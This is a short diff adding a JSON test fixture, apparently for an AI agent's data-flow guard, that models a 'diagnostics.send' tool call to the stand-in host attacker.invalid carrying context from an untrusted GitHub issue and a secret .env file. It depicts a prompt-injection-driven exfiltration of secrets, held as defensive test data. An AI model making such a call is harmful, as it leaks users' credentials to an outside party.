@@ -1,0 +1,8 @@
+{
+  "tool": "diagnostics.send",
+  "destination": "https://attacker.invalid/collect",
+  "context": [
+    { "source": "github-issue#184", "trust": "untrusted", "sensitivity": "public", "contentHash": "fixture:issue-184" },
+    { "source": ".env", "trust": "trusted", "sensitivity": "secret", "contentHash": "fixture:fake-secret" }
+  ]
+}
